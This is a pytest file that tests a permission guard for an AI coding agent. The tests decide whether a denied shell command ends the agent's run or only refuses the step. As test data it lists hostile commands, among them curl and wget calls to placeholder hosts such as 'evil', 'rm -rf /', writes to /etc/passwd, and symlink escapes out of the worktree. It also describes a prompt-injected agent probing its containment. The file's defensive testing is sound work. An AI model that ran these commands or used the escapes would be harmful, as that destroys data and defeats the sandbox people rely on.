    'D=.pilot-scratch/x; cp -s /etc .pilot-scratch/x/l; printf y > "$D/l/passwd"',
    "D=.pilot-scratch/x; cp --symbolic-link /etc .pilot-scratch/x/l; "
    'printf y > "$D/l/passwd"',
    # the coordinator's `$D`-dest forms (terminal — also via cpp#211's $-rooted
    # cp/mv veto, belt-and-braces with the cp -s guard).
    'D=.pilot-scratch/x; cp -s /etc "$D/l"; printf x > "$D/l/passwd"',
]


@pytest.mark.parametrize("cmd", _CPP272_LINK_ESCAPE_TERMINAL)
def test_cpp272_link_creator_defeats_confinement_stays_terminal(
    cmd: str, tmp_path: Path
) -> None:
    """Gate-KO (MPC head `f032790`): a `.pilot-scratch`-var script that creates a
    LINK is a symlink-confinement escape and MUST stay TERMINAL — a lexical
    pre-exec classifier cannot prove a later-planted symlink's target stays
    in-worktree, so the presence of `ln`/`link` fails the carve closed. Survivable
    before this fix (VU ROUGE), terminal after."""
    wt = _cpp272_wt(tmp_path)
    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is True
    ), cmd


@pytest.mark.parametrize("cmd", _CPP272_SURVIVABLE)
def test_cpp272_pilot_scratch_var_is_survivable(cmd: str, tmp_path: Path) -> None:
    """Positive (the fix): a `.pilot-scratch/` (or `$PWD/.pilot-scratch/`) target
    carried by a variable — mkdir, chmod or redirect — is a SURVIVABLE deny
    (`_denial_is_terminal` → ``False``), instead of killing the session."""
    wt = _cpp272_wt(tmp_path)
    _skip_if_cpp272_unwired(wt)
    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is False
    ), cmd


@pytest.mark.parametrize("cmd", _CPP272_TERMINAL)
def test_cpp272_negatives_stay_terminal(cmd: str, tmp_path: Path) -> None:
    """Negatives (AC3): a `..` traversal, an out-of-worktree `$PWD/..`, every
    cpp#270 reassignment-out form, a non-`.pilot-scratch` `$PWD/<x>`, a `..`
    redirect tail, and `$HOME`/absolute/`$(…)` roots ALL stay TERMINAL."""
    wt = _cpp272_wt(tmp_path)
    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is True
    ), cmd


def test_cpp272_outbound_symlink_and_unresolvable_cwd_stay_terminal(
    tmp_path: Path,
) -> None:
    """Fail-closed (cpp#213/#38): a `.pilot-scratch` that is an OUTBOUND symlink,
    and an unresolvable cwd, keep the deny TERMINAL — the `.pilot-scratch` root is
    held to the SAME fs-aware containment `rm_confined_to_pilot_scratch` uses."""
    f = permissions_module._denial_is_terminal
    bad = tmp_path / "bad"
    (bad / ".git").mkdir(parents=True)
    outside = tmp_path / "outside"
    outside.mkdir()
    (bad / ".pilot-scratch").symlink_to(outside, target_is_directory=True)
    for cmd in (
        'D=.pilot-scratch/x; mkdir -p "$D"',
        'R="$PWD/.pilot-scratch/x"; mkdir -p "$R"',
        'D=.pilot-scratch/x; printf y > "$D/a"',
    ):
        assert f("Bash", {"command": cmd}, str(bad)) is True, cmd
    missing = str(tmp_path / "does-not-exist")
    assert f("Bash", {"command": 'D=.pilot-scratch/x; mkdir -p "$D"'}, missing) is True


def test_cpp272_admission_is_byte_identical_only_lethality_flips(
    tmp_path: Path,
) -> None:
    """Sovereign boundary: admission for the `.pilot-scratch` var case is
    byte-identical to HEAD — the command is STILL denied. Nothing is
    tier1-auto-approved, the policy still default-denies, and the REFUSAL path
    (`for_lethality=False`) still returns a destination veto. Only
    `_denial_is_terminal` flips terminal→survivable; end-to-end the handler
    returns a non-terminal ``PermissionResultDeny``, never an allow."""
    from claude_pilot.policy import evaluate, load_policy
    from claude_pilot.tier1 import is_tier1_auto_approve

    wt = _cpp272_wt(tmp_path)
    _skip_if_cpp272_unwired(wt)
    cmd = 'D=.pilot-scratch/git-probe; mkdir -p "$D"'

    # Admission UNCHANGED — the REFUSAL path still vetoes (the `$`-rooted mkdir).
    assert (
        permissions_module._destination_veto_reason(cmd, wt, for_lethality=False)
        is not None
    )
    assert is_tier1_auto_approve("Bash", {"command": cmd}, wt) is False
    policy = load_policy(_BUNDLED_POLICY)
    assert evaluate(policy, "Bash", {"command": cmd}).decision == "deny"

    # End-to-end: refused, but the run survives.
    result = asyncio.run(_bundled_handler(cwd=wt)("Bash", {"command": cmd}, _mock_ctx()))
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is False


# ── cpp#237: a read-only wait-loop script is a SURVIVABLE deny (mika#2105) ─────
#
# The verbatim mika#2105 command (pilot e1a6c78b, 2026-09-29T15:13:20Z) that died
# TERMINAL on the `\bsh\s+-c\b` lethality verb. The lethality carve
# (`is_readonly_waitloop_script`, tier1.py) is wired into
# `permissions._denial_is_terminal` by a guardrail edit gated to Vincent's manual
# apply window; until that hunk lands these end-to-end assertions are SKIPPED (the
# recognizer itself is exercised directly in
# ``tests/test_tier1.py::TestReadonlyWaitloopScript``).
_CPP237_WAITLOOP_2105 = (
    "sh -c 'n=0; while [ $n -lt 55 ]; do "
    "if [ -f .pilot-scratch/measures.txt ]; "
    "then cat .pilot-scratch/measures.txt; exit 0; fi; "
    "sleep 10; n=$((n+1)); done; "
    "du -sm target; tail -1 .pilot-scratch/cold0.log'"
)


def _skip_if_cpp237_unwired(wt: str) -> None:
    if permissions_module._denial_is_terminal(
        "Bash", {"command": _CPP237_WAITLOOP_2105}, wt
    ):
        pytest.skip(
            "cpp#237 lethality wiring in permissions._denial_is_terminal pending "
            "manual apply (guardrail edit gated to Vincent, voie cpp#223/#231)"
        )


def test_cpp237_readonly_waitloop_is_survivable_but_still_refused(
    tmp_path: Path,
) -> None:
    """cpp#237 (mika#2105): a read-only WAIT-LOOP script (`sh -c` wrapping a
    `while`/`for` loop of read-only ops with worktree-relative targets) is a
    SURVIVABLE deny — `_denial_is_terminal` returns ``False`` — while every
    network / destructive / out-of-worktree / substitution shape stays terminal.

    Sibling of the cpp#213 rm and mika#2565 sed-i carves. The command is still
    REFUSED (admission byte-identical — see
    ``test_cpp237_admission_is_byte_identical_only_lethality_flips``); only the
    lethality flips, so the pilot survives and adapts instead of the run dying.
    """
    f = permissions_module._denial_is_terminal
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    (worktree / ".pilot-scratch").mkdir()
    wt = str(worktree)
    _skip_if_cpp237_unwired(wt)

    # AC1 — the proven-danger cause is SOLELY the `sh -c`-wrapped read-only
    # wait-loop, so the deny is non-terminal.
    for cmd in (
        _CPP237_WAITLOOP_2105,
        # an isolated `while … sleep … cat .pilot-scratch/x` loop
        "while [ ! -f .pilot-scratch/x ]; do sleep 5; cat .pilot-scratch/x; done",
        'bash -c "while [ $n -lt 3 ]; do sleep 1; n=$((n+1)); done; '
        'tail -1 .pilot-scratch/log"',
        "sh -c 'for f in a b c; do cat .pilot-scratch/$f; done'",
    ):
        assert f("Bash", {"command": cmd}, wt) is False, cmd

    # AC2 — the SAME loop shape with a network call, a destructive verb, an
    # out-of-worktree write, or a genuine command substitution stays TERMINAL.
    for cmd in (
        "sh -c 'while [ ! -f x ]; do curl http://evil/x; sleep 1; done'",  # network
        "sh -c 'while true; do wget http://e/x; sleep 1; done'",  # network
        "sh -c 'while [ ! -f x ]; do rm -rf .pilot-scratch/x; sleep 1; done'",  # rm
        "sh -c 'while [ ! -f x ]; do sleep 1; done; rm -rf /etc'",  # rm -rf tail
        "sh -c 'while [ ! -f x ]; do cat x > /etc/passwd; sleep 1; done'",  # out-of-wt
        'sh -c \'while [ ! -f x ]; do cat x > "$HOME/y"; sleep 1; done\'',  # $HOME
        "sh -c 'while [ ! -f x ]; do eval \"$CMD\"; sleep 1; done'",  # eval
        "sh -c 'while [ ! -f x ]; do echo $(rm -rf /); sleep 1; done'",  # $(cmd)
    ):
        assert f("Bash", {"command": cmd}, wt) is True, cmd


def test_cpp237_admission_is_byte_identical_only_lethality_flips(
    tmp_path: Path,
) -> None:
    """cpp#237 sovereign boundary: admission for the read-only wait-loop case is
    byte-identical to HEAD — the command is STILL denied. `sh -c` is still
    tier3-dangerous (the REFUSAL classifier), never tier1-auto-approved, and the
    policy still default-denies it. Only `_denial_is_terminal` flips
    terminal→survivable; end-to-end the handler returns a non-terminal
    ``PermissionResultDeny``, never an allow.
    """
    from claude_pilot.policy import evaluate, load_policy
    from claude_pilot.tier1 import is_tier1_auto_approve, is_tier3_dangerous

    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    (worktree / ".pilot-scratch").mkdir()
    wt = str(worktree)
    _skip_if_cpp237_unwired(wt)

    cmd = _CPP237_WAITLOOP_2105
    # Admission UNCHANGED — none of these consult the cpp#237 lethality carve.
    assert is_tier3_dangerous(cmd) is True
    assert is_tier1_auto_approve("Bash", {"command": cmd}, wt) is False
    policy = load_policy(_BUNDLED_POLICY)
    assert evaluate(policy, "Bash", {"command": cmd}).decision == "deny"

    # End-to-end: refused, but the run survives.
    result = asyncio.run(
        _bundled_handler(cwd=wt)("Bash", {"command": cmd}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is False


# ── cpp#252: a read-only process substitution is a SURVIVABLE deny (mika#2252) ─
#
# The verbatim mika#2252 command (pilot #2252, 5cfd4bc8, 2026-09-30T13:52:26Z)
# that died TERMINAL on HEAD on the `<\(` lethality verb. The lethality carve
# (`readonly_procsub_survivable`, tier1.py) is wired into
# `permissions._denial_is_terminal` by a guardrail edit gated to Vincent's manual
# apply window (a lethality carve trips the [Security Weaken] classifier); until
# that hunk lands these end-to-end assertions are SKIPPED (the recognizer itself
# is exercised directly in
# ``tests/test_tier1.py::TestReadonlyProcsubSurvivable``).
_CPP252_PROCSUB_2252 = (
    "diff <(git show HEAD:crates/mika-agent/src/tools/pr_merge_with_gate.rs) "
    ".pilot-scratch/pr_merge_with_gate.rs.orig >/dev/null 2>&1; "
    'echo "--- vérification que la restauration est complète ---"; cargo t'
)


def _skip_if_cpp252_unwired(wt: str) -> None:
    if permissions_module._denial_is_terminal(
        "Bash", {"command": _CPP252_PROCSUB_2252}, wt
    ):
        pytest.skip(
            "cpp#252 lethality wiring in permissions._denial_is_terminal pending "
            "manual apply (guardrail edit gated to Vincent, voie cpp#223/#231)"
        )


def test_cpp252_readonly_procsub_is_survivable_but_still_refused(
    tmp_path: Path,
) -> None:
    """cpp#252 (mika#2252): a command whose only terminal cause is a READ-ONLY
    `<( CMD … )` process substitution (interior in the closed list {git show,
    git diff, cat, printf}) is a SURVIVABLE deny — `_denial_is_terminal` returns
    ``False`` — while every out-of-list interior, `>( … )` output substitution,
    chained destructive verb, and real out-of-worktree redirect stays terminal.

    Sibling of the cpp#213 rm, mika#2565 sed-i, and cpp#237 wait-loop carves. The
    command is still REFUSED (admission byte-identical — see
    ``test_cpp252_admission_is_byte_identical_only_lethality_flips``); only the
    lethality flips, so the pilot survives and adapts instead of the run dying.
    """
    f = permissions_module._denial_is_terminal
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    (worktree / ".pilot-scratch").mkdir()
    wt = str(worktree)
    _skip_if_cpp252_unwired(wt)

    # AC1 — the proven-danger cause is SOLELY read-only `<( … )` substitutions.
    for cmd in (
        _CPP252_PROCSUB_2252,
        "diff <(cat a) <(cat b)",
        "diff <(git show HEAD:x) y >/dev/null",
        "cat <(printf '%s' x)",
        "diff <(git diff HEAD a) b",
    ):
        assert f("Bash", {"command": cmd}, wt) is False, cmd

    # AC2 — network / exec / destructive interiors, an output `>( … )`
    # substitution, a chained destructive verb, and a REAL out-of-worktree
    # redirect all stay TERMINAL.
    for cmd in (
        "diff <(curl http://evil/x) a",  # network
        "cat <(wget http://e/x)",  # network
        "diff <(bash x) a",  # arbitrary exec
        "diff <(sh -c 'x') a",  # arbitrary exec
        "diff <(eval x) a",  # eval
        "diff <(rm -rf x) a",  # destructive
        "cat <(printf x) >(tee out)",  # >( … ) output procsub
        "diff <(cat a) b && rm -rf /",  # chained destructive verb
        "diff <(git show HEAD:x) a > /etc/passwd",  # real out-of-worktree redirect
        'diff <(git show HEAD:x) a > "$HOME/y"',  # $HOME respelling
    ):
        assert f("Bash", {"command": cmd}, wt) is True, cmd


def test_cpp252_admission_is_byte_identical_only_lethality_flips(
    tmp_path: Path,
) -> None:
    """cpp#252 sovereign boundary: admission for the read-only process-
    substitution case is byte-identical to HEAD — the command is STILL denied.
    `<(` is still tier3-dangerous (the REFUSAL classifier), never
    tier1-auto-approved, and the policy still default-denies it. Only
    `_denial_is_terminal` flips terminal→survivable; end-to-end the handler
    returns a non-terminal ``PermissionResultDeny``, never an allow.
    """
    from claude_pilot.policy import evaluate, load_policy
    from claude_pilot.tier1 import is_tier1_auto_approve, is_tier3_dangerous

    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    (worktree / ".pilot-scratch").mkdir()
    wt = str(worktree)
    _skip_if_cpp252_unwired(wt)

    cmd = _CPP252_PROCSUB_2252
    # Admission UNCHANGED — none of these consult the cpp#252 lethality carve.
    assert is_tier3_dangerous(cmd) is True
    assert is_tier1_auto_approve("Bash", {"command": cmd}, wt) is False
    policy = load_policy(_BUNDLED_POLICY)
    assert evaluate(policy, "Bash", {"command": cmd}).decision == "deny"

    # End-to-end: refused, but the run survives.
    result = asyncio.run(
        _bundled_handler(cwd=wt)("Bash", {"command": cmd}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is False


def test_containment_escape_is_lethal_on_the_default_deny_route(
    tmp_path: Path,
) -> None:
    """The security gap the review found, closed and pinned.

    ``mkdir -p <outside>`` matches the ``bash-mkdir`` allow rule, so it reaches
    ``_destination_veto_reason`` at its own call site and halts. The SAME escape
    with a label prefixed -- ``echo "go"; mkdir -p <outside>`` -- fails
    chain-safety, never reaches that call site, and before this change came back
    non-terminal. Both must halt, otherwise the containment boundary degrades
    from a one-shot tripwire into an oracle a prompt-injected pilot can probe
    once per turn for the rest of its budget.

    The paired control is the same command pointing INSIDE the worktree: it must
    stay non-terminal, or the fix would have made ordinary refusals fatal again.

    ``outside`` is a FIXED literal, not a ``tmp_path``-derived directory (cpp#143):
    pytest's ``tmp_path`` fixture itself lives under ``/tmp``, which is now a
    sanctioned ``mkdir`` scratch destination (see
    ``test_mkdir_tmp_scratch_is_permitted_but_other_outside_targets_stay_lethal``
    below) -- a genuinely-outside-the-worktree probe must be tested with a
    target that is unambiguously outside BOTH the worktree AND the scratch
    exception, or this test would silently stop testing what it says it tests.
    """
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    outside = "/definitely/outside/x"
    handler = _bundled_handler(cwd=str(worktree))

    allow_matched = asyncio.run(
        handler("Bash", {"command": f"mkdir -p {outside}"}, _mock_ctx())
    )
    assert isinstance(allow_matched, PermissionResultDeny)
    assert allow_matched.interrupt is True

    chain_vetoed = asyncio.run(
        handler("Bash", {"command": f'echo "go"; mkdir -p {outside}'}, _mock_ctx())
    )
    assert isinstance(chain_vetoed, PermissionResultDeny)
    assert chain_vetoed.interrupt is True, (
        "a containment escape must end the run on the chain-veto route too"
    )

    # Control: the identical shape INSIDE the worktree is refused, not fatal.
    inside = asyncio.run(
        handler("Bash", {"command": 'echo "go"; mkdir -p docs/plans'}, _mock_ctx())
    )
    assert isinstance(inside, PermissionResultDeny)
    assert inside.interrupt is False


def test_mkdir_tmp_scratch_is_permitted_but_other_outside_targets_stay_lethal(
    tmp_path: Path,
) -> None:
    """cpp#143: the incoherence the issue reports, fixed and negatively controlled.

    Before this fix, ``mkdir -p /tmp/<scratch>`` was refused AND terminal --
    the exact shape that killed session ``0160cce6`` (72 tool calls, 2h52) --
    while ``cat > /tmp/x <<'EOF'`` was, and still is, routine. This test proves
    the asymmetry is gone for ``mkdir`` specifically, and that nothing broader
    was opened: a system path is still refused and still terminal (AC3), and a
    `..`-mediated escape THROUGH `/tmp` does not sneak out under the exception.
    """
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    handler = _bundled_handler(cwd=str(worktree))

    # Positive: a /tmp scratch directory -- the exact 0160cce6 shape -- is now
    # ALLOWED (not merely non-terminal; it actually executes).
    scratch = asyncio.run(
        handler(
            "Bash",
            {"command": "mkdir -p /tmp/rt005-empty-nobatch /tmp/rt005-empty-runs/runs"},
            _mock_ctx(),
        )
    )
    assert isinstance(scratch, PermissionResultAllow), (
        "a working directory under /tmp must be permitted, symmetric with the "
        "existing cat-heredoc-to-/tmp file exception"
    )

    # AC3 negative control: a system path is unaffected -- refused, terminal.
    system_path = asyncio.run(
        handler("Bash", {"command": "mkdir -p /etc/cpp143-should-never-exist"}, _mock_ctx())
    )
    assert isinstance(system_path, PermissionResultDeny)
    assert system_path.interrupt is True, (
        "an out-of-scope mkdir (system path, not /tmp) must stay refused and "
        "terminal -- the scratch exception must not widen containment itself"
    )

    # Negative control: a literal `..` in the operand is rejected by the
    # exception's own pattern (mirrors the heredoc's `(?!.*\.\.)`) -- it never
    # reaches a resolve step that could be fooled.
    traversal = asyncio.run(
        handler("Bash", {"command": "mkdir -p /tmp/../etc/cpp143-traversal"}, _mock_ctx())
    )
    assert isinstance(traversal, PermissionResultDeny)
    assert traversal.interrupt is True, (
        "a /tmp-prefixed operand containing .. must not be exempted -- the "
        "exception's own pattern excludes it, no resolve required"
    )

    # Negative control: a symlink INSIDE the worktree that resolves into /tmp
    # is still a cpp#38 containment escape, not a scratch write. The exception
    # is lexical (the literal command text, not the resolved path), so a
    # route that never spells `/tmp/...` in the command does not qualify --
    # this is the one case an earlier (resolve-based) version of this fix got
    # wrong, and it must stay caught.
    (worktree / "esc").symlink_to("/tmp")
    symlink_escape = asyncio.run(
        handler("Bash", {"command": "mkdir -p esc/via-symlink"}, _mock_ctx())
    )
    assert isinstance(symlink_escape, PermissionResultDeny)
    assert symlink_escape.interrupt is True, (
        "a worktree symlink resolving into /tmp is a containment escape "
        "(cpp#38), not the sanctioned /tmp scratch exception (cpp#143) -- "
        "the exception only matches a command that itself spells /tmp/..."
    )

    # Unit-level pin on the helper itself, both arms, so a revert is caught
    # even if the handler-level assertions above are ever loosened.
    f = permissions_module._is_sanctioned_tmp_scratch
    assert f("/tmp/rt005-x") is True
    assert f("/tmp/rt005-x/nested/dir") is True
    assert f("/tmp") is False, "no trailing segment -- conservative on ambiguity"
    assert f("/tmp/../etc/passwd") is False
    assert f("/etc/passwd") is False
    assert f("esc/via-symlink") is False, "relative -- not a literal /tmp/ operand"
    assert f("") is False


# ────────────────────────────────────────────────────────────────────────────
# cpp#155 — `_segment_write_kind` classifies shell-redirect writes from any
# verb (`echo`, `cat`, `tee`, …), not just `cp`/`mv`/`mkdir`/`git show >`.
# `_destination_veto_reason` — the function claude-pilot#155 names as BLIND to
# redirections ("`_destination_veto_reason` returns None" for
# `echo hi > /etc/passwd`, measured against `main`) — now sees them too.
#
# `_denial_is_terminal`'s AGGREGATE verdict for these commands was already
# `True` via `is_tier3_dangerous_for_lethality` (cpp#130/#154/#157) and
# `_redirect_destination_veto_reason` (cpp#154) — this section proves
# `_destination_veto_reason` now ALSO proves it independently, which is what
# closes the gap on the function the ticket names, and on the ALLOWED path
# (`create_permission_handler`'s `pd.decision == "allow"` branch, `:1360`),
# where `_redirect_destination_veto_reason` is never consulted at all.
# ────────────────────────────────────────────────────────────────────────────


def test_segment_write_kind_classifies_redirects_from_any_verb() -> None:
    """Unit pin on the new fallback branch (cpp#155)."""
    f = permissions_module._segment_write_kind
    # New: a real file-target redirect from a verb none of the four leading-
    # word cases name.
    assert f("echo hi > /etc/passwd") == "bash-redirect"
    assert f("cat > /tmp/x") == "bash-redirect"
    assert f("tee /tmp/y < in > /tmp/z") == "bash-redirect"
    assert f("some_unknown_binary --flag > out.log") == "bash-redirect"
    assert f("echo hi >> /etc/passwd") == "bash-redirect"
    assert f("cmd &> /tmp/log") == "bash-redirect"
    # Unaffected: the four leading-word branches still win, unchanged, and the
    # redirect fallback is never reached for them.
    assert f("cp a.txt b.txt") == "bash-cp-mv"
    assert f("mv a.txt b.txt") == "bash-cp-mv"
    assert f("mkdir -p x") == "bash-mkdir"
    assert f("git show deadbeef:f > dest") == "bash-git-show-redirect"
    # No file-target redirect at all -- unclassified, exactly as before.
    assert f("grep -c a b") is None
    assert f("echo hi") is None
    # fd-duplication names no file -- unclassified, mirroring
    # `_redirect_destination_veto_reason`'s own "ignored" forms.
    assert f("cmd 2>&1") is None
    assert f("mika ask >&-") is None
    # `cmd > >(tee f)`: the FIRST `>`'s "target" text is `>(tee f)`, but the
    # target charset excludes `>` (it is the delimiter), so the match is an
    # EMPTY target -- `_redirect_targets` fails closed to `None` for the
    # WHOLE segment (same as `_redirect_destination_veto_reason` and
    # `is_tier3_dangerous_for_lethality` already do for this exact string,
    # pinned in `TestTier3ContainedRedirectLethality`/`test_non_file_redirect_
    # forms` in test_tier1.py). `None` classifies (this docstring's own
    # "targets is None ... STILL classified" clause), and the segment then
    # fails closed downstream too -- `_extract_write_destinations` also
    # returns `None`, so `_destination_veto_reason` vetoes it as an
    # unparseable destination. Conservative, not a false negative.
    assert f("cmd > >(tee f)") == "bash-redirect"
    assert (
        permissions_module._extract_write_destinations("bash-redirect", "cmd > >(tee f)")
        is None
    )
    # `tee FILE` (argument-based write, no shell redirect) is a DIFFERENT,
    # still-open gap -- out of scope for cpp#155, which teaches
    # `_segment_write_kind` about REDIRECTION OPERATORS specifically (the
    # ticket's own scope: `>`, `>>`, `N>`, `N>>`, `&>`, `&>>`), not about verbs
    # whose own argument names a write target. Flagged in the PR body.
    assert f("tee /etc/passwd") is None


def test_destination_veto_now_fires_for_redirects_to_system_or_escaped_paths(
    tmp_path: Path,
) -> None:
    """The exact gap claude-pilot#155 reports, closed and pinned directly on
    `_destination_veto_reason`.

    Anti-vacuity: every assertion below is `is None` on `main` (before this
    fix) -- pasted as the captured red in the PR body.
    """
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    f = permissions_module._destination_veto_reason
    wt = str(worktree)

    assert f("echo hi > /etc/passwd", wt) is not None
    assert f("echo hi > ../escape", wt) is not None
    assert f("echo hi > ~/x", wt) is not None
    assert f("echo hi > $VAR/x", wt) is not None
    assert f("echo hi >> /etc/passwd", wt) is not None
    assert f("cat /dev/stdin > /etc/shadow", wt) is not None
    assert f("echo hi > .git/hooks/pre-commit", wt) is not None


def test_destination_veto_still_none_for_tmp_scratch_and_worktree_relative(
    tmp_path: Path,
) -> None:
    """Negative controls: the SAME lexical `/tmp` exception cpp#143/#154 already
    grant (`_is_contained_redirect_target` + the `/tmp/` prefix), reused
    verbatim, plus an ordinary worktree-relative write."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    f = permissions_module._destination_veto_reason
    wt = str(worktree)

    assert f("echo hi > /tmp/scratch", wt) is None
    assert f("echo hi > /tmp/2158bodies/$n.md", wt) is None  # D3 residue, cpp#154
    assert f("echo hi > ./out.txt", wt) is None
    assert f("echo hi > notes.txt", wt) is None
    assert f("echo hi > docs/plans/x.md", wt) is None
    # /dev/null writes nowhere (cpp#130) -- must not regress into a hard veto
    # now that a bare redirect is a classified write-kind.
    assert f("grep -c a b >/dev/null", wt) is None
    assert f("grep -c a b >/dev/null 2>&1", wt) is None
    # fd-duplication names no file -- never reaches the veto loop.
    assert f("cmd 2>&1 | tail", wt) is None


def test_destination_veto_symlink_escape_via_bare_redirect(tmp_path: Path) -> None:
    """cpp#38 extended to a redirect target for the first time (cpp#155): a
    worktree symlink resolving OUT of the worktree is still an escape, caught
    by the same disk-resolving `is_within_project` the cp/mv/mkdir write-kinds
    already use. `_is_contained_redirect_target` lexically admits a plain
    relative target like `esc/x` (no `..`/`~`/leading-`$`), so the disk check
    gets a chance to run and catch the symlink -- exactly the cpp#143 lesson
    (grant exemptions lexically, but let escapes be caught by resolution).
    """
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    (tmp_path / "outside").mkdir()
    (worktree / "esc").symlink_to(tmp_path / "outside", target_is_directory=True)
    f = permissions_module._destination_veto_reason
    assert f("echo hi > esc/x", str(worktree)) is not None


def test_destination_veto_heredoc_body_text_not_misread_as_a_command(
    tmp_path: Path,
) -> None:
    """Regression guard for the trap named in `_destination_veto_reason`'s own
    docstring: `_split_compound_command` splits on a bare newline (cpp#103), so
    without the `_is_sanctioned_pure_heredoc` shortcut, a heredoc BODY line
    that happens to contain literal text shaped like a dangerous redirect
    (`echo hi > /etc/passwd`, never executed -- the quoted delimiter makes the
    body inert, cpp#47) would be misclassified as a live write and veto a
    routine, currently-ALLOWED heredoc.
    """
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    cmd = "cat > /tmp/cpp155_body.rs <<'EOF'\necho hi > /etc/passwd\nEOF"
    assert permissions_module._destination_veto_reason(cmd, str(worktree)) is None


def test_denial_is_terminal_redirect_gap_closed_at_destination_veto_too(
    tmp_path: Path,
) -> None:
    """`_denial_is_terminal` was already `True` for these via
    `is_tier3_dangerous_for_lethality` (the tier3 `>` pattern is never stripped
    for an un-contained target) -- this test pins that `_destination_veto_
    reason` now ALSO proves it independently. The aggregate verdict is
    unchanged; the specific function claude-pilot#155 names is no longer
    blind.
    """
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    for cmd in (
        "echo hi > /etc/passwd",
        "echo hi > ../escape",
        "echo hi > ~/x",
        "echo hi > $VAR/x",
    ):
        assert permissions_module._destination_veto_reason(cmd, wt) is not None, cmd
        assert (
            permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt)
            is True
        ), cmd


def test_handler_vetoes_redirect_to_system_path_end_to_end(tmp_path: Path) -> None:
    """Handler-level proof, mirroring
    `test_containment_escape_is_lethal_on_the_default_deny_route` above: a
    redirect to a system path is refused AND terminal through the real
    `can_use_tool` callback, not merely at the unit level.
    """
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    handler = _bundled_handler(cwd=str(worktree))

    result = asyncio.run(
        handler("Bash", {"command": "echo hi > /etc/passwd"}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is True

    # Control: the same shape targeting /tmp scratch stays refused, not fatal.
    scratch = asyncio.run(
        handler("Bash", {"command": "echo hi > /tmp/cpp155-scratch"}, _mock_ctx())
    )
    assert isinstance(scratch, PermissionResultDeny)
    assert scratch.interrupt is False


# ────────────────────────────────────────────────────────────────────────────
# cpp#176 — REGRESSION of cpp#155/PR#173: an ABSOLUTE redirect target that
# RESOLVES inside the worktree was vetoed fail-closed, TERMINAL, because
# `_destination_veto_reason`'s `bash-redirect` containment accepted a target
# only if it was LEXICALLY under `/tmp/` or worktree-RELATIVE — never an
# absolute path, no matter where it actually resolved. Builds routinely
# redirect to an absolute worktree path
# (`/usr/bin/time -v cargo build ... > <abs-worktree-path>/out`); this killed
# mika#1719 mid-build, zero commits.
#
# The fix routes that case through the SAME cpp#38 `is_within_project`
# resolution the `cp`/`mv`/`mkdir`/`git show` write-kinds already use for
# their own destinations — symlink-aware, bounded to the worktree — instead
# of an automatic lexical veto. It does NOT touch the `/tmp/` exception (kept
# purely lexical, cpp#143/#150/#155) and does NOT loosen anything else: a
# target outside the worktree and not under `/tmp/`, and a symlink that
# resolves outside the worktree, both stay vetoed and terminal.
# ────────────────────────────────────────────────────────────────────────────
#
# These tests deliberately do NOT build their worktree under pytest's own
# `tmp_path` fixture: on this platform `tmp_path` itself resolves under
# `/tmp/...`, and an absolute redirect target rooted there would ALSO satisfy
# the pre-existing, unrelated `/tmp/`-prefix lexical exception (cpp#143/#150/
# #155) -- confounding "allowed because it resolves in the worktree" (the
# thing cpp#176 fixes) with "allowed because it is literally under /tmp/"
# (unchanged, already true before this fix). `_make_non_tmp_worktree` roots
# the worktree under `/var/tmp` instead, so the redirect target's absolute
# text never starts with `/tmp/` and the two exceptions cannot be conflated —
# this is what makes case 1 below a genuine pre-fix regression (a mika
# worktree lives under `/data/workspace/mika-platform/...`, never `/tmp/`).


def _make_non_tmp_worktree(request: pytest.FixtureRequest) -> Path:
    """A real worktree directory OUTSIDE `/tmp`, cleaned up at test teardown."""
    import shutil
    import tempfile

    base = Path(tempfile.mkdtemp(dir="/var/tmp", prefix="cpp176-wt-"))
    request.addfinalizer(lambda: shutil.rmtree(base, ignore_errors=True))
    worktree = base / "wt"
    (worktree / ".git").mkdir(parents=True)
    return worktree


def test_destination_veto_allows_absolute_redirect_target_within_worktree(
    request: pytest.FixtureRequest,
) -> None:
    """cpp#176 — THE REGRESSION CASE, case 1 of the mandatory negative-test
    gate. On `main` at d9f9254 (the deployed regression, PR#173/cpp#155) this
    assertion FAILS — `f(...)` returns a non-None veto reason, because an
    absolute path is accepted ONLY when it is lexically under `/tmp/`, never
    when it merely resolves inside the worktree. Pasted verbatim as the
    captured red in the PR body.

    This is the exact shape of the mika#1719 command probe: `cargo build`
    redirecting stdout to an absolute path under the pilot's own worktree
    (which, like the real mika#1719 worktree, does NOT live under `/tmp/`).
    """
    worktree = _make_non_tmp_worktree(request)
    (worktree / "sub").mkdir()
    f = permissions_module._destination_veto_reason
    wt = str(worktree)
    abs_target = str(worktree / "sub" / "out.txt")
    cmd = (
        "/usr/bin/time -v cargo build --release --features telemetry "
        f"--bin mika-spirit > {abs_target}"
    )
    assert f(cmd, wt) is None


def test_destination_veto_symlink_escape_via_absolute_redirect_still_refused(
    request: pytest.FixtureRequest,
) -> None:
    """cpp#176 — mandatory negative-test gate, case 2. Negative control: the
    fix must NOT loosen containment for a symlink that resolves OUTSIDE the
    worktree, even when spelled as an ABSOLUTE, worktree-prefixed path.
    `is_within_project` (cpp#38) resolves symlinks on existing path
    components, so a real symlink `esc -> <outside the worktree>` still
    escapes and is still vetoed — the fix ROUTES the absolute case through
    this same resolution, it does not bypass it.
    """
